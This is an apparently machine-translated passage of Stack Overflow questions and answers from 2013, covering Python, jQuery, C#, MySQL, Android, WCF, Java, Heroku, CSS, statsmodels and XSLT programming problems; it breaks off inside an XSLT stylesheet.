The output with this code comes to: (0, 6, 4).

""" 
```

单列在某种意义上是错误的，但在某种意义上也是正确的。那不是我关心的问题。我担心的是零不被计算在内。零被设置为 0 那么我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T19:58:00.250

问题是该方法`_node_counts_aux()`返回一个元组，但您正试图添加`1`到它的结果中。您必须从递归调用中提取类型为 0、1 和 2 的元素的计数，并改用这些值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T21:30:39.997

您必须累积递归调用的结果。这可以通过 来完成`zero, one, two = map(sum, zip(result_right, result_left))`，然后根据子项的数量添加相应的值。

请注意，我使用`if/elif`语句，否则当节点有两个孩子时，您的代码也会进入下一个`if`块中的一个孩子。

```
def _node_counts_aux(self, node):
    zero, one, two = 0, 0, 0
    if node is not None:
        result_right = self._node_counts_aux(node._right)
        result_left = self._node_counts_aux(node._left)
        zero, one, two = map(sum, zip(result_right, result_left))
        if not node._right and not node._left:
            zero += 1
        elif node._left and node._right:
            two += 1
        elif node._left or node._right:
            one += 1
    return zero, one, two 
```

# jquery - Node.js Express jquery ajax请求不起作用

> ID：15533132
> 
> 赞同：2
> 
> 时间：2013-03-20T19:39:35.220
> 
> 标签：jquery, ajax, node.js, express, restful-architecture

使用 RESTful api，当我在浏览器中访问 96.126.111.211/getLeaderBoard

它工作正常，并为我提供了我的 mongo 数据库中的 JSON 数据。

虽然当我尝试像这样[http://jsfiddle.net/yVQ5T/](http://jsfiddle.net/yVQ5T/)的 jquery ajax 请求时，我得到一个 jsonp 错误

> 错误：未调用 jQuery171037622810900211334_1363808084624

这是服务器端的代码

```
getLeaderBoard(req, res)
{
    this.db.collection(this.settings.userTable, function(err, collection) => {
        collection.find().toArray(function(err, items) {
            res.writeHead(200, {'Content-Type': 'application/javascript'});

            res.write(JSON.stringify(items));

            res.end();
        });
    });
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:43:04.397

您的网址提供常规 JSON 而不是 JSONP，您必须将其放在对回调函数的调用中，例如

```
jQuery171037622810900211334_1363808084624 ([{"userId":"100821494565115211032","winCount":4,"_id":"5148caa1a1651dff12000002"}]); 
```

由于回调名称是动态生成的，因此您必须从请求中读取它们。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T19:45:48.930

如果您使用的是 Express 3.0，您可以查看`response.jsonp`哪个与`response.json`. 如果您从另一个域访问您的服务器，那么由于浏览器作为安全措施实施的跨域请求限制，您将不得不使用 JSONP 协议。

在 express 2.x 中，您需要通过启用 JSONP 响应处理`app.enabled("jsonp callback")`，然后使用`response.json`

[3.0 API](http://expressjs.com/api.html#res.jsonp)

[2.0 API](http://expressjs.com/2x/guide.html)

# c++ - 在 ELF 文件中我可以在 C++ 中看到损坏的名称

> ID：15533133
> 
> 赞同：0
> 
> 时间：2013-03-20T19:39:38.360
> 
> 标签：c++

我已阅读有关目标文件的名称修饰和 ELF 文件格式的信息。我想知道 ELF 的哪个部分/段，错误的名称被存储了？.text 或符号表？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T23:30:27.033

看看这里[http://www.skyfree.org/linux/references/ELF_Format.pdf](http://www.skyfree.org/linux/references/ELF_Format.pdf)第 1-8 页。符号表（`.symtab`部分）将包含所有符号，这些符号基本上是一个地址和一个名称，它是该`.strtab`部分的偏移量。您可以在该 ELF_Format.pdf 中找到确切的结构。另请查看此问题以了解各部分之间的一些差异：[ELF 中的字符串表](https://stackoverflow.com/questions/11289843/string-table-in-elf)

一个玩转精灵格式的好工具是`readelf`： http: [//linux.die.net/man/1/readelf](http://linux.die.net/man/1/readelf)。我知道它的可执行文件与 MinGW 一起分发

# c# - 确保所有更新都成功完成？

> ID：15533134
> 
> 赞同：1
> 
> 时间：2013-03-20T19:39:38.157
> 
> 标签：c#, asp.net, .net, sql-server, sql-server-2008

当提交新表单时，我有一些存储过程可以对几个表进行各种更新和插入。它们都是从我拥有的 C# 应用程序中调用的。

现在一切都是一种`try catch`格式，有没有一种方法可以确保在实际将更改提交到数据库之前，它们都已成功完成？

因此，假设前 3 个存储过程一切正常，但第 4 个存储过程失败，我想扭转前 3 个存储过程中已经完成的操作。

全有或全无类型的交易。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:00:16.020

您需要使用[TransactionScope](http://msdn.microsoft.com/en-us/library/system.transactions.transactionscope.aspx/ "交易范围")类 (System.Transactions.TransactionScope)

```
//assuming Table1 has a single INT column, Column1 and has one row with value 12345
//and connectionstring contains a valid connection string to the database.
    //this automatically starts a transaction for you
try
{
            using (TransactionScope ts = new TransactionScope())
            {
        //you can open as many connections as you like within the scope although they need to be on the same server. And the transaction scope goes out of scope if control leaves this code.
               using (SqlConnection conn = new SqlConnection(connectionstring))
               {
                  conn.Open();
                  using (SqlCommand comm = new SqlCommand("Insert into Table1(Column1) values(999)")
                  {
                    comm.ExecuteNonQuery();
                  }
                   using (SqlCommand comm1 = new SqlCommand("DELETE from Table1 where Column1=12345"))
                   {
                     comm1.ExecuteNonQuery();
                   }
                }//end using conn
               ts.Complete() ; //commit the transaction; Table1 now has 2 rows (12345 and 999) 
            }//end using ts

}
  catch(Exception ex)
   {
     //Transaction is automatically rolled back for you at this point, Table1 retains original row.
   } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T19:46:12.447

我不确定你是如何配置它的；但你显然可以使用`SqlException`Class。但另一种方法可能是：

```
int result = command.ExecuteNonQuery();
if(result == 1)
{
    // Successfully Entered A Row
}
else
{
    // Insert Row Failed
} 
```

这是一种可能的测试方法。本质上它是在测试查询，如果它带回一行，那么它成功，如果没有，它就会失败。我不确定它是否符合您的标准，但这是您可以测试的两种方式。

* * *

**更新：**

因为我看不懂 - 但我相信你想实现一种`Transactioning`. 这实际上将处理所有请求，如果失败，它将回滚更改。它确实增加了很多开销，在某些情况下可能会导致其他性能问题。因此，您需要根据需要定制和优化数据库吞吐量。

这是[MSDN 关于它](http://msdn.microsoft.com/en-us/library/system.transactions.transaction.aspx)的一些信息。

希望这会有所帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T19:46:16.650

我会为您在前 3 个中添加的新项目捕获唯一键，如果您失败了，只需根据这些键删除。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T19:47:55.357

你应该读这个

[wiki:数据库事务](http://en.wikipedia.org/wiki/Database_transaction)

和这个

[msdn：编写事务性应用程序](http://msdn.microsoft.com/en-us/library/ms229973.aspx)

# mysql - MySQL查询将求和，但如果在其他字段中声明

> ID：15533140
> 
> 赞同：1
> 
> 时间：2013-03-20T19:39:53.360
> 
> 标签：mysql

我在使用 mysql 查询时遇到问题，我想用 else if 语句选择 SUM，这就是我的故事。

我的查询：

```
SELECT SUM(s.total_revenue) AS sum_revenue, m.revenue_type AS revenue_type, d.campaignid AS placement_id
FROM ox_data_summary_ad_hourly AS s
INNER JOIN ox_banners AS d ON (d.bannerid = s.ad_id) 
INNER JOIN ox_campaigns AS m ON (m.campaignid = d.campaignid) 
INNER JOIN ox_clients AS a ON (a.clientid = m.clientid) 
WHERE a.type = 0
GROUP BY placement_id
LIMIT 0 , 30 
```

并在上面查询得到如下结果：

![在此处输入图像描述](../Images/413fdf6a8030af8d32625b0f80dd3227.png)

我想生成查询：如果收入类型 = 4 将改变值 sum_revenue = 值放置_id，示例结果我想如下图所示：

![在此处输入图像描述](../Images/7e9647a7834dc499c8fb7e4bc251d7bb.png)

谢谢你帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:44:29.503

您可以使用`CASE`表达式来获取结果：

```
SELECT 
    case 
        when m.revenue_type = 4 
        then d.campaignid 
        else SUM(s.total_revenue) end AS sum_revenue, 
    m.revenue_type AS revenue_type, 
    d.campaignid AS placement_id
FROM ox_data_summary_ad_hourly AS s
INNER JOIN ox_banners AS d 
    ON (d.bannerid = s.ad_id) 
INNER JOIN ox_campaigns AS m 
    ON (m.campaignid = d.campaignid) 
INNER JOIN ox_clients AS a 
    ON (a.clientid = m.clientid) 
WHERE a.type = 0
GROUP BY placement_id
LIMIT 0 , 30 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T19:46:27.227

SELECT case when m.revenue_type = 4 then d.campaignid else SUM(s.total_revenue) AS sum_revenue end, m.revenue_type ASincome_type, d.campaignid AS placement_id FROM ox_data_summary_ad_hourly AS s INNER JOIN ox_banners AS d ON (d.bannerid = s .ad_id) INNER JOIN ox_campaigns AS m ON (m.campaignid = d.campaignid) INNER JOIN ox_clients AS a ON (a.clientid = m.clientid) WHERE a.type = 0 GROUP BY placement_id LIMIT 0 , 30

# java - Android：删除列表视图中某些列表项的分隔符

> ID：15533141
> 
> 赞同：6
> 
> 时间：2013-03-20T19:39:57.063
> 
> 标签：java, android, android-listview, baseadapter, divider

我创建了一个带有`BaseAdapter`. 我希望一些列表项有一个分隔符，但是从一些列表项中，我想删除分隔符。`.setDivider(null)`我知道您可以通过设置and删除整个列表的分隔符`.setDividerHeight(0)`，但是是否也可以从列表中的单个列表项中删除分隔符？

提前致谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T20:19:11.600

您可以禁用整个列表的分隔线并为每个设置自定义视图`ListItem`，例如设置不同的背景可绘制对象，带或不带底部边框。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T20:50:38.283

是的，您可以使用适配器中的 `getView` 方法从特定列表项中删除分隔符（扩展了 baseadapter）

ofc 你的适配器中有类似的东西`data`，它指的是显示到列表视图中的数据，所以在你的`getview`方法中检查如下特定项目：

```
if(data[position].ID == YourElemetnsID)
inflate with the specific list item layout
else
inflate with the general list item layout 
```

# jquery - 将 2 个 id 与高级参数结合起来

> ID：15533144
> 
> 赞同：2
> 
> 时间：2013-03-20T19:40:05.660
> 
> 标签：jquery

我正在尝试将 2 个调用合并为 1 个，但由于其中一个类对子内容的“额外”，我不确定如何。

```
$('.abc').children().not(".xyz").click(function() { //stuff     });
$('#myid').click(function() {   //same stuff    }); 
```

通常，我会这样做，但`$('.abc , #myid')`在这种情况下我不想受到影响的子孩子（不像`myid``xyz``.abc`），所以我不能结合所有的东西。

合并这两者的最佳方法是什么，这样我就不会重新编写相同的“东西”功能？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T19:45:28.897

如果将它放在一个调用中至关重要，您可以将第一个选择器简化为

```
$('.abc :not(.xyz)') 
```

这将允许你使用

```
$('.abc :not(.xyz), #myid') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T19:42:47.823

您始终可以使用命名函数

```
function doStuff() { /* stuff */ }

$('.abc').children().not(".xyz").click(doStuff);
$('#myid').click(doStuff); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T19:45:30.863

您仍然可以执行类似于`$('.abc , #myid')`使用 .add 方法的操作。

```
$('.abc').children().not(".xyz").add('#myid').click(function(){ /* stuff*/ }); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-20T19:44:22.260

你可以试试：

```
$('.abc').children().not(".xyz").add('#myid').click(function() {
  // stuff
}) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-20T19:43:48.303

你可以试试这个：

```
function doStuff(){
  // your same stuffs
}

$('.abc').children().not(".xyz").click(doStuff);
$('#myid').click(doStuff); 
```

# json - 从自托管的 WCF 4.5 服务返回 JSON？

> ID：15533149
> 
> 赞同：0
> 
> 时间：2013-03-20T19:40:26.677
> 
> 标签：json, wcf, rest, self-hosting

如何从自托管的 WCF 4.5 服务获取 JSON？

我正在使用 Fiddler2 发送带有“Content-Type: application/json”的请求（也尝试过“Content-Type: application/javascript”），但我不断收到 XML。

结合在我的 WebHttpBehavior 上设置“AutomaticFormatSelectionEnabled = true”，我仍然得到 XML，并且当使用“Content-Type：application/json”时，服务器根本不会响应（然后我得到错误 103）

我在我的 WebHttpBinding 上启用了 CrossDomainScriptAccessEnabled，并且我在控制台主机中使用了 WebServiceHost。

服务非常简单：

```
[ServiceContract]
public interface IWebApp
{
  [OperationContract, WebGet(UriTemplate = "/notes/{id}")]
  Note GetNoteById(string id);
} 
```

我还尝试将 AutomaticFormatSelectionEnabled 设置为 false 并在我的服务合同中使用 ResponseFormat = WebMessageFormat.Json 但这也会导致“错误 103”而没有更多信息。

我已经关闭了 customErrors 并将 FaultExceptionEnabled、HelpEnabled 设置为 true（不确定这是否会对此做任何事情，但只是为了确保我已经尝试了所有方法）

我是否缺少 dll 或其他内容？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T21:13:20.363

尝试从简单的开始，如下面的代码（适用于 4.5）。从那里，您可以开始一次添加您的代码使用的功能，直到您发现它中断的那一刻。这将使您更好地了解出了什么问题。

```
using System;
using System.Net;
using System.ServiceModel;
using System.ServiceModel.Web;

namespace ConsoleApplication5
{
    class Program
    {
        static void Main(string[] args)
        {
            string baseAddress = "http://localhost:8000/Service";
            WebServiceHost host = new WebServiceHost(typeof(Service), new Uri(baseAddress));
            host.Open();
            Console.WriteLine("Host opened");

            WebClient c = new WebClient();
            Console.WriteLine(c.DownloadString(baseAddress + "/notes/a1b2"));

            Console.WriteLine("Press ENTER to close");
            Console.ReadLine();
            host.Close();
        }
    }

    public class Note
    {
        public string Id { get; set; }
        public string Title { get; set; }
        public string Contents { get; set; }
    }

    [ServiceContract]
    public interface IWebApp
    {
        [OperationContract, WebGet(UriTemplate = "/notes/{id}", ResponseFormat = WebMessageFormat.Json)]
        Note GetNoteById(string id);
    }

    public class Service : IWebApp
    {
        public Note GetNoteById(string id)
        {
            return new Note
            {
                Id = id,
                Title = "Shopping list",
                Contents = "Buy milk, bread, eggs, fruits"
            };
        }
    }
} 
```

# java - 额外的数组不消耗Java中的内存？

> ID：15533152
> 
> 赞同：-1
> 
> 时间：2013-03-20T19:40:38.290
> 
> 标签：java, arrays, memory

在 Java 中，为什么这样

```
int n = 100000;
int[] array = new int[n + n / 2];
int[] arrayzip = new int[n];
System.arraycopy(array, 0, arrayzip, 0, n);
hashmap.put(x, arrayzip); 
```

和这个

```
int n = 100000;
int[] array = new int[n + n / 2];
hashmap.put(x, new int[n]);
System.arraycopy(array, 0, hashmap.get(x), 0, n); 
```

占用相同数量的内存？在第一个代码示例中，创建了一个额外的数组。

**[编辑]**好的，现在是第二个问题：

```
for (int i = 0; i < 100; i++) {
    int n = 100000;
    int[] array = new int[n + n / 2];
    int[] arrayzip = new int[n];
    System.arraycopy(array, 0, arrayzip, 0, n);
    hashmap.put(x, arrayzip);
} 
```

如果我们将任何代码示例放入循环中，然后`arrayzip`创建`100`时间，然后`100`由于在循环中的作用域而所有引用都消失了，该怎么办。啊，现在我明白了，所以对象`new int[]`是在堆上创建的，但它们不会丢失（垃圾收集），因为它们将引用存储在范围外的 object`hashmap`中。酷，我明白了！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-20T19:41:45.797

不，两个样本都创建了相同数量的数组 - 2。它们都包含以下数组创建表达式：

```
new int[n + n / 2]
new int[n] 
```

您认为在哪里创建了另一个数组？或者您是否没有发现第二种情况下的数组创建表达式，在此语句中：

```
hashmap.put(x, new int[n]); 
```

在第一个版本中，对其中一个的引用被分配给局部变量这一事实在创建多少对象方面*没有区别。*

（顺便说一句，我个人*更*喜欢第一个代码而不是第二个代码。它更容易理解，IMO。）

# python - Base64 使用 re 和 base64 模块对字符串的一部分进行解码

> ID：15533160
> 
> 赞同：1
> 
> 时间：2013-03-20T19:41:17.377
> 
> 标签：python, regex, base64, decode

谁能演示如何使用正则表达式搜索对字符串的特定部分进行 base64 解码？我希望最终结果返回整个字符串，但对 base64 区域进行解码。

**类别标签和子类别标签之间的文本应该被解码，然后应该返回整个 strinf。**

```
<attack_headline><site_id>1</site_id><category>U1FMIEluamVjdGlvbg==</category><subcategory>Q2xhc3NpYyBTUUwgQ29tbWVudCAmcXVvdDstLSZxdW90Ow==</subcategory><client_ip>192.168.1.102</client_ip><date>1363807248</date><gmt_diff>0</gmt_diff><reference_id>E711-3EFB-5F43-5FAC</reference_id></attack_headline> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:53:20.220

根据我的评论，这是一个使用 的示例`lxml.etree`，它假设您的输入是 XML（如果是 HTML，请`lxml.html`改用）：

```
>>> import base64
>>> import lxml.etree
>>> text = "<attack_headline><site_id>1</site_id><category>U1FMIEluamVjdGlvbg==</category><subcategory>Q2xhc3NpYyBTUUwgQ29tbWVudCAmcXVvdDstLSZxdW90Ow==</subcategory><client_ip>192.168.1.102</client_ip><date>1363807248</date><gmt_diff>0</gmt_diff><reference_id>E711-3EFB-5F43-5FAC</reference_id></attack_headline>"
>>> xml = lxml.etree.fromstring(text)
>>> for tag_with_base64 in ('category','subcategory'):
...     node = xml.find(tag_with_base64)
...     if node:
...         node.text = base64.b64decode(node.text)
>>> lxml.etree.tostring(xml)
'<attack_headline><site_id>1</site_id><category>SQL Injection</category><subcategory>Classic SQL Comment &amp;quot;--&amp;quot;</subcategory><client_ip>192.168.1.102</client_ip><date>1363807248</date><gmt_diff>0</gmt_diff><reference_id>E711-3EFB-5F43-5FAC</reference_id></attack_headline>' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T21:12:59.740

```
events = client.service.get_recent_attacks("",epoch_time_last,epoch_time_now,1,"",15)
text = re.sub('(?<!<\/attack_headline>)\s*\n\s*', '',  events)
xml = lxml.etree.fromstring(text)
for tag_with_base64 in ('category','subcategory'):
    node = xml.find(tag_with_base64)
    node.text = base64.b64decode(node.text)
lxml.etree.tostring(xml) 
```

# git - Heroku 部署停止工作

> ID：15533164
> 
> 赞同：1
> 
> 时间：2013-03-20T19:41:25.460
> 
> 标签：git, heroku

我有一个带有 2 个测功机（一个网络和一个工人）的 python heroku 应用程序。
由于过去几个小时我似乎无法部署

尝试部署（“git push heroku master”）时出现以下错误

```
Permission denied (publickey).
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists. 
```

直到今天，这一直运行良好。

我还检查了以下内容，它们似乎是正确的：

*   我的公钥是在我的帐户下定义的
*   我的应用正在响应（例如不是空闲）
*   在 git config 文件中正确配置了存储库 url

还有什么可以改变的？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-21T09:37:26.630

我设法找到了问题。

运行时`ssh -vT git@github.com`（感谢@Tuxdude 的指针）我注意到它正在寻找我的 ssh 身份`~/.ssh/id_rsa`

显然我的 ssh 密钥文件被命名为`github_rsa`和`github_rsa.pub`.

将名称更改为`id_rsa`并`id_rsa.pub`解决了问题。

仍然不确定它以前是如何工作的，因为我总是有这样命名的文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T21:27:43.857

尝试运行以下命令：

```
$ heroku keys:clear
$ heroku keys:add 
```

第一个将消除 Heroku 对您拥有的任何密钥的任何期望。第二个会将您的密钥添加回您的 heroku 帐户。如果您还有其他问题，请先尝试以下操作，然后再尝试上述命令：

```
$ heroku auth:logout
$ heroku auth:login 
```

这将确保您获得正确帐户的正确授权。

# css - 具有固定标题的表格上的水平滚动

> ID：15533167
> 
> 赞同：3
> 
> 时间：2013-03-20T19:41:29.863
> 
> 标签：css, scroll, html-table, scrollbar

我已经使用CSS创建了一个固定的标题（主要只是设置要固定的thead的位置），但是我遇到的问题是如果用户的分辨率大小或窗口大小小于表格大小，我需要添加在水平滚动条中，以便他们可以看到所有内容。我尝试将溢出设置为自动和滚动，但只有当我向下滚动到页面底部时才会出现滚动条。此外，我需要能够让标题随表格滚动。如果窗口小于表格大小，是否有关于显示水平滚动条的任何建议，以及如何让标题仍然固定在一个位置，但如果窗口尺寸太小，仍然滚动以查看更多标题？

[http://jsfiddle.net/E9mqk/1/](http://jsfiddle.net/E9mqk/1/)

HTML 是：

```
<div class="table-wrapper">
<table id="table-information">
    <colgroup></colgroup>
    <colgroup></colgroup>
    <colgroup></colgroup>
    <colgroup></colgroup>
    <colgroup></colgroup>
    <colgroup></colgroup>
    <colgroup></colgroup>
    <colgroup></colgroup>
    <thead class="table-fixed-header" id="table-data">
        <tr>
            <th>Something 1</th>
            <th>Something 2</th>
            <th>Something 3</th>
            <th>Something 4</th>
            <th>Something 5</th>
            <th>Something 6</th>
            <th>Something 7</th>
            <th>Something 8</th>
        </tr>
    </thead>
    <tbody class="table-body">   
        <tr>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
        </tr>
        <tr>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
        </tr>
        <tr>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
            <td>Data</td>
        </tr>
    </tbody>
</table>
</div> 
```

CSS是：

```
.table-wrapper {
    overflow-x: scroll;
}
.table-fixed-header {
    position: fixed;
}
#table-information tbody:before {
    line-height: 30px;
    content:"-";
    color:white; /* to hide text */
    display:block;
}
#table-information td {
    max-width: 100px;
    min-width: 100px;
}
#table-information th {
    max-width: 100px;
    min-width: 100px;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:47:50.097

假设您没有在 Javascript 中做一些会在表格上产生奇怪行为的事情，您可以将表格包装在

```
 <div style="overflow-x: scroll;">
   [your table here]
 </div> 
```

或其他具有相同样式的块元素，您将获得您所寻求的行为，包括头部和身体相互滚动 - 请参阅[this jsfiddle](http://jsfiddle.net/BFYbz/)以获取工作示例。

# python - statmodels 回归图 不适用于 pandas 数据类型

> ID：15533174
> 
> 赞同：0
> 
> 时间：2013-03-20T19:42:19.280
> 
> 标签：python, pandas, statsmodels

```
import numpy as np
import pandas as pd
import statsmodels.api as sm
import statsmodels.graphics as smg

data = pd.DataFrame({'Y': np.random.rand(1000), 'X':np.random.rand(1000)}) 
```

这有效

```
smg.regressionplots.plot_fit(sm.OLS(data.Y.values, data.X.values).fit(), 0, y_true=None) 
```

这不

```
smg.regressionplots.plot_fit(sm.OLS(data.Y, data.X).fit(), 0, y_true=None)
smg.regressionplots.plot_fit(sm.OLS(data['Y'], data['X']).fit(), 0, y_true=None) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T22:14:32.283

我追查了一下，确实是`plot_fit`代码中的一个错误。在稳定版本中，您会发现这一行：

```
prstd, iv_l, iv_u = wls_prediction_std(results) 
```

它返回`iv_l`和`iv_u`，大概是用于绘制拟合值的标准差的上限值和下限值，作为熊猫系列。这会导致后续调用`ax.fill_between`失败。

这似乎已在开发版本[https://github.com/statsmodels/statsmodels/blob/master/statsmodels/graphics/regressionplots.py](https://github.com/statsmodels/statsmodels/blob/master/statsmodels/graphics/regressionplots.py)中得到修复。在那里你会发现一个不同的调用：

```
prstd, iv_l, iv_u = wls_prediction_std(results._results) 
```

`iv_l`现在`iv_u`是 numpy 数组，如果你这样做应该不再有错误：

```
smg.regressionplots.plot_fit(sm.OLS(data['Y'], data['X']).fit(), 0, y_true=None) 
```

现在你只需要满足

```
smg.regressionplots.plot_fit(sm.OLS(data.Y.values, data.X.values).fit(), 0, y_true=None) 
```

即使它与通常对标准线性回归的调用并不完全一致。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-20T19:52:30.323

错误消息揭示了正在发生的事情。冷凝：

```
/usr/lib/pymodules/python2.7/matplotlib/axes.pyc in fill_between(self, x, y1, y2, where, interpolate, **kwargs)

   6542                 start = xslice[0], y2slice[0]
-> 6543                 end = xslice[-1], y2slice[-1]

[...]
/usr/local/lib/python2.7/dist-packages/pandas-0.11.0.dev_fc8de6d-py2.7-linux-i686.egg/pandas/core/index.pyc in get_value(self, series, key)

    725         try:
--> 726             return self._engine.get_value(series, key)
    727         except KeyError, e1:
    728             if len(self) > 0 and self.inferred_type == 'integer':

[...]

KeyError: -1L 
```

`data.X`and`data.Y`是`Series`对象，你不能使用 . 获取最后一个元素`[-1]`。如果可以，那么当您有一个用作`-1`其元素之一的索引时，您可能会遇到麻烦：您想要最后一个元素，还是与 关联的那个`-1`？

`pandas`尊重“面对歧义，拒绝猜测”的原则，并选择不让这项工作，优先考虑标签而不是位置。你得到一个`KeyError`，而不是一个`IndexError`，这暗示了这一点。例如，请参阅文档中关于[使用整数标签进行高级索引](http://pandas.pydata.org/pandas-docs/stable/indexing.html#advanced-indexing-with-integer-labels)的讨论。

# xslt - 计算变换后的节点值

> ID：15533180
> 
> 赞同：0
> 
> 时间：2013-03-20T19:42:39.780
> 
> 标签：xslt

我正在尝试使用分隔符“|”将 xml 转换为本机平面文件格式。我坚持要获得最后一个先例复杂类型。我需要在 TotalRec 中分配这个计数值。

**这是我的 XSLT：-**

```
<xsl:stylesheet version="1.0"
                xmlns:xp20="http://www.oracle.com/XSL/Transform/java/oracle.tip.pc.services.functions.Xpath20"
                xmlns:bpws="http://schemas.xmlsoap.org/ws/2003/03/business-process/"
                xmlns:ns1="http://TargetNamespace.com/WriteGSIASNFile"
                xmlns:bpel="http://docs.oasis-open.org/wsbpel/2.0/process/executable"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:tns="http://xmlns.oracle.com/pcbpel/adapter/file/WMStoATG/WMSShipmentConfirmation/ReadWMSShipmentConfirmationFile"
                xmlns:pc="http://xmlns.oracle.com/pcbpel/"
                xmlns:imp1="http://www.manh.com/ILSNET/Interface"
                xmlns:bpm="http://xmlns.oracle.com/bpmn20/extensions"
                xmlns:plt="http://schemas.xmlsoap.org/ws/2003/05/partner-link/"
                xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
                xmlns:ora="http://schemas.oracle.com/xpath/extension"
                xmlns:socket="http://www.oracle.com/XSL/Transform/java/oracle.tip.adapter.socket.ProtocolTranslator"
                xmlns:mhdr="http://www.oracle.com/XSL/Transform/java/oracle.tip.mediator.service.common.functions.MediatorExtnFunction"
                xmlns:oraext="http://www.oracle.com/XSL/Transform/java/oracle.tip.pc.services.functions.ExtFunc"
                xmlns:dvm="http://www.oracle.com/XSL/Transform/java/oracle.tip.dvm.LookupValue"
                xmlns:ns0="http://xmlns.oracle.com/pcbpel/adapter/file/WMStoRMS/WMSShipmentConfirmation/WriteGSIASNFile"
                xmlns:hwf="http://xmlns.oracle.com/bpel/workflow/xpath"
                xmlns:jca="http://xmlns.oracle.com/pcbpel/wsdl/jca/"
                xmlns:med="http://schemas.oracle.com/mediator/xpath"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:ids="http://xmlns.oracle.com/bpel/services/IdentityService/xpath"
                xmlns:xdk="http://schemas.oracle.com/bpel/extension/xpath/function/xdk"
                xmlns:xref="http://www.oracle.com/XSL/Transform/java/oracle.tip.xref.xpath.XRefXPathFunctions"
                xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                xmlns:ldap="http://schemas.oracle.com/xpath/extension/ldap"
                exclude-result-prefixes="xsi xsl tns pc imp1 plt wsdl jca xsd ns1 ns0 xp20 bpws bpel bpm ora socket mhdr oraext dvm hwf med ids xdk xref ldap">
  <xsl:template match="/">
    <xsl:variable name="RecordCount"
                  select="count(/imp1:WMWROOT/imp1:WMWDATA/imp1:WMFWUpload/imp1:Shipments/imp1:Shipment/imp1:Containers/imp1:ShippingContainer/imp1:NestedContainers/imp1:ShippingContainer/imp1:ContainerDetails/imp1:ContainerDetail)"/>
    <ns1:ASN-Feed>
      <xsl:for-each select="/imp1:WMWROOT/imp1:WMWDATA/imp1:WMFWUpload/imp1:Shipments/imp1:Shipment">
        <xsl:if test='((/imp1:WMWROOT/imp1:WMWDATA/imp1:WMFWUpload/imp1:Shipments/imp1:Shipment/imp1:OrderType = "Refill") or (/imp1:WMWROOT/imp1:WMWDATA/imp1:WMFWUpload/imp1:Shipments/imp1:Shipment/imp1:OrderType = "Store Order")) and ((/imp1:WMWROOT/imp1:WMWDATA/imp1:WMFWUpload/imp1:Shipments/imp1:Shipment/imp1:Warehouse = "8001") and (/imp1:WMWROOT/imp1:WMWDATA/imp1:WMFWUpload/imp1:Shipments/imp1:Shipment/imp1:Details/imp1:ShipmentDetail[1]/imp1:UserDef3 != ""))'>
          <xsl:variable name="BolNumAlpha" select="imp1:BolNumAlpha"/>
          <xsl:for-each select="imp1:Containers/imp1:ShippingContainer">
            <xsl:for-each select="imp1:NestedContainers/imp1:ShippingContainer">
              <xsl:variable name="ContainerId" select="imp1:ContainerId"/>
              <xsl:for-each select="imp1:ContainerDetails/imp1:ContainerDetail">
                <xsl:variable name="ErpOrderContLevel" select="imp1:ErpOrder"/>
                <xsl:variable name="ErpOrderLineNumContLevel"
                              select="imp1:ErpOrderLineNum"/>
                <xsl:variable name="Position" select="position()"/>
                <ns1:Header>
                  <ns1:StoreNum>
                    <xsl:text disable-output-escaping="no">763</xsl:text>
                  </ns1:StoreNum>
                  <ns1:ReceivingType>
                    <xsl:text disable-output-escaping="no">A</xsl:text>
                  </ns1:ReceivingType>
                  <ns1:PartnerShipmentNum>
                    <xsl:text disable-output-escaping="no"></xsl:text>
                  </ns1:PartnerShipmentNum>
                  <ns1:OrderDate>
                    <xsl:text disable-output-escaping="no"></xsl:text>
                  </ns1:OrderDate>
                  <ns1:ShipmentReceiptDate>
                    <xsl:value-of select='xp20:format-dateTime(xp20:current-date(),"[Y01]-[M01]-[D01]")'/>
                  </ns1:ShipmentReceiptDate>
                  <ns1:ShipperName>
                    <xsl:text disable-output-escaping="no">001 GARAGE MONTREAL</xsl:text>
                  </ns1:ShipperName>
